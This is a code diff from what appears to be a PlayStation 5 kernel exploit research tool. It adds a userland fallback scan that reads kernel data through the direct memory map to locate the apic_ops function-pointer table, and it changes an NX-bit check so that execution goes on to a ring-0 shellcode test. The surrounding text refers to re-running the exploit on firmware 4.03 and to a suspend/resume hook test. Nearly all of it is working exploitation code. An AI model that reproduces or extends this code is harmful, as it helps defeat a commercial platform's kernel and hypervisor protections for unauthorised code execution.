@@ -3085,9 +3085,10 @@ ring3_fallback:
                    (int)((orig_pte >> 8) & 1), (int)((orig_pte >> 5) & 1));
             fflush(stdout);
 
-            if (!(orig_pte >> 63)) {
-                printf("[!] NX already clear — page is already executable?!\n");
-                goto r0_skip;
+            int nx_already_clear = !(orig_pte >> 63);
+            if (nx_already_clear) {
+                printf("[+] NX already clear — page is executable (expected after Phase 5b).\n");
+                printf("    Proceeding with ring-0 execution test.\n");
             }
 
             /* Step 1: Save original kdata content and write shellcode.
@@ -4703,7 +4704,185 @@ static void campaign_flatz_setup(void) {
         printf("    2. Put PS5 in REST MODE (Settings > Power > Rest Mode)\n");
         printf("    3. Wake PS5 + re-run exploit + hv_research.elf\n");
         printf("    4. Check if ktext becomes readable (unlikely on FW 4.03)\n");
-        /* ─── Phase 7: apic_ops suspend/resume persistence + hook test ─── */
+        /* ─── Fallback apic_ops discovery via DMAP (no ring-0 needed) ─── */
+        if (!g_apic_ops_addr || g_apic_ops_count < 4) {
+            printf("\n[*] apic_ops not found by Phase 3 — running DMAP-based fallback scan...\n");
+            fflush(stdout);
+
+            /*
+             * Scan kdata via DMAP for clusters of consecutive ktext pointers.
+             * This is the same algorithm as Phase 3 but runs from userland.
+             * ktext pointer range: ktext_base to ktext_base + 32MB
+             * kdata scan range: kdata_base to kdata_base + 8MB
+             */
+            uint64_t fb_ktext_size = 0x2000000; /* 32MB */
+            #define FB_SCAN_SIZE   0x800000  /* 8MB of kdata */
+            #define FB_SCAN_CHUNK  0x1000    /* 4KB at a time */
+            #define FB_MIN_RUN     4
+
+            int fb_run_len = 0;
+            uint64_t fb_run_start = 0;
+            uint64_t fb_best_addr = 0;
+            int fb_best_len = 0;
+            int fb_best_score = 0;
+            int fb_tables = 0;
+
+            uint8_t fb_chunk[FB_SCAN_CHUNK];
+
+            for (uint64_t off = 0; off < FB_SCAN_SIZE; off += FB_SCAN_CHUNK) {
+                uint64_t scan_kva = g_kdata_base + off;
+                uint64_t scan_pa = va_to_pa_quiet(scan_kva);
+                if (scan_pa == 0 || scan_pa >= MAX_SAFE_PA) {
+                    if (fb_run_len >= FB_MIN_RUN) {
+                        fb_tables++;
+                        if (fb_run_len >= 26 && fb_run_len <= 30) {
+                            /* Score this candidate */
+                            uint64_t tbl_pa = va_to_pa_quiet(fb_run_start);
+                            if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                                uint64_t tbl[40];
+                                int cnt = fb_run_len > 40 ? 40 : fb_run_len;
+                                kernel_copyout(g_dmap_base + tbl_pa, tbl, cnt * 8);
+                                int uniq = 0;
+                                uint64_t pmin = tbl[0], pmax = tbl[0];
+                                for (int u = 0; u < cnt; u++) {
+                                    if (tbl[u] < pmin) pmin = tbl[u];
+                                    if (tbl[u] > pmax) pmax = tbl[u];
+                                    int dup = 0;
+                                    for (int v = 0; v < u; v++)
+                                        if (tbl[v] == tbl[u]) { dup = 1; break; }
+                                    if (!dup) uniq++;
+                                }
+                                uint64_t spread = pmax - pmin;
+                                int score = 10;
+                                if (cnt == 28) score += 5;
+                                if (spread >= 0x400 && spread <= 0x10000) score += 20;
+                                else if (spread < 0x400) score -= 10;
+                                else score -= 5;
+                                score += uniq;
+                                if (score > fb_best_score) {
+                                    fb_best_addr = fb_run_start;
+                                    fb_best_len = cnt;
+                                    fb_best_score = score;
+                                }
+                            }
+                        }
+                    }
+                    fb_run_len = 0;
+                    continue;
+                }
+
+                kernel_copyout(g_dmap_base + scan_pa, fb_chunk, FB_SCAN_CHUNK);
+
+                for (int qi = 0; qi < FB_SCAN_CHUNK; qi += 8) {
+                    uint64_t qval;
+                    memcpy(&qval, &fb_chunk[qi], 8);
+
+                    int is_ktext = (qval >= g_ktext_base &&
+                                    qval < g_ktext_base + fb_ktext_size &&
+                                    (qval & 0x3) == 0);
+
+                    if (is_ktext) {
+                        if (fb_run_len == 0)
+                            fb_run_start = scan_kva + qi;
+                        fb_run_len++;
+                    } else {
+                        if (fb_run_len >= FB_MIN_RUN) {
+                            fb_tables++;
+                            if (fb_run_len >= 26 && fb_run_len <= 30) {
+                                uint64_t tbl_pa = va_to_pa_quiet(fb_run_start);
+                                if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                                    uint64_t tbl[40];
+                                    int cnt = fb_run_len > 40 ? 40 : fb_run_len;
+                                    kernel_copyout(g_dmap_base + tbl_pa, tbl, cnt * 8);
+                                    int uniq = 0;
+                                    uint64_t pmin = tbl[0], pmax = tbl[0];
+                                    for (int u = 0; u < cnt; u++) {
+                                        if (tbl[u] < pmin) pmin = tbl[u];
+                                        if (tbl[u] > pmax) pmax = tbl[u];
+                                        int dup = 0;
+                                        for (int v = 0; v < u; v++)
+                                            if (tbl[v] == tbl[u]) { dup = 1; break; }
+                                        if (!dup) uniq++;
+                                    }
+                                    uint64_t spread = pmax - pmin;
+                                    int score = 10;
+                                    if (cnt == 28) score += 5;
+                                    if (spread >= 0x400 && spread <= 0x10000) score += 20;
+                                    else if (spread < 0x400) score -= 10;
+                                    else score -= 5;
+                                    score += uniq;
+                                    if (score > fb_best_score) {
+                                        fb_best_addr = fb_run_start;
+                                        fb_best_len = cnt;
+                                        fb_best_score = score;
+                                    }
+                                }
+                            }
+                        }
+                        fb_run_len = 0;
+                    }
+                }
+            }
+            /* Flush final run */
+            if (fb_run_len >= FB_MIN_RUN && fb_run_len >= 26 && fb_run_len <= 30) {
+                uint64_t tbl_pa = va_to_pa_quiet(fb_run_start);
+                if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                    uint64_t tbl[40];
+                    int cnt = fb_run_len > 40 ? 40 : fb_run_len;
+                    kernel_copyout(g_dmap_base + tbl_pa, tbl, cnt * 8);
+                    int uniq = 0;
+                    uint64_t pmin = tbl[0], pmax = tbl[0];
+                    for (int u = 0; u < cnt; u++) {
+                        if (tbl[u] < pmin) pmin = tbl[u];
+                        if (tbl[u] > pmax) pmax = tbl[u];
+                        int dup = 0;
+                        for (int v = 0; v < u; v++)
+                            if (tbl[v] == tbl[u]) { dup = 1; break; }
+                        if (!dup) uniq++;
+                    }
+                    uint64_t spread = pmax - pmin;
+                    int score = 10;
+                    if (cnt == 28) score += 5;
+                    if (spread >= 0x400 && spread <= 0x10000) score += 20;
+                    else if (spread < 0x400) score -= 10;
+                    else score -= 5;
+                    score += uniq;
+                    if (score > fb_best_score) {
+                        fb_best_addr = fb_run_start;
+                        fb_best_len = cnt;
+                        fb_best_score = score;
+                    }
+                }
+                fb_tables++;
+            }
+
+            if (fb_best_addr) {
+                g_apic_ops_addr = fb_best_addr;
+                g_apic_ops_count = fb_best_len;
+                printf("[+] Fallback scan found apic_ops at kdata+0x%lx (%d entries, score=%d)\n",
+                       (unsigned long)(fb_best_addr - g_kdata_base),
+                       fb_best_len, fb_best_score);
+                printf("    xapic_mode [2] at kdata+0x%lx\n",
+                       (unsigned long)(fb_best_addr - g_kdata_base + 0x10));
+                /* Dump entries */
+                uint64_t dump_pa = va_to_pa_quiet(fb_best_addr);
+                if (dump_pa && dump_pa < MAX_SAFE_PA) {
+                    uint64_t dump_ops[32];
+                    int dc = fb_best_len > 32 ? 32 : fb_best_len;
+                    kernel_copyout(g_dmap_base + dump_pa, dump_ops, dc * 8);
+                    for (int di = 0; di < dc; di++)
+                        printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                               di, (unsigned long)dump_ops[di],
+                               (unsigned long)(dump_ops[di] - g_ktext_base));
+                }
+            } else {
+                printf("[-] Fallback scan: no apic_ops candidate found (%d tables scanned).\n",
+                       fb_tables);
+            }
+            fflush(stdout);
+        }
+
+    /* ─── Phase 7: apic_ops suspend/resume persistence + hook test ─── */
         printf("\n=============================================\n");
         printf("  Phase 7: apic_ops Suspend/Resume Hook Test\n");
         printf("=============================================\n\n");
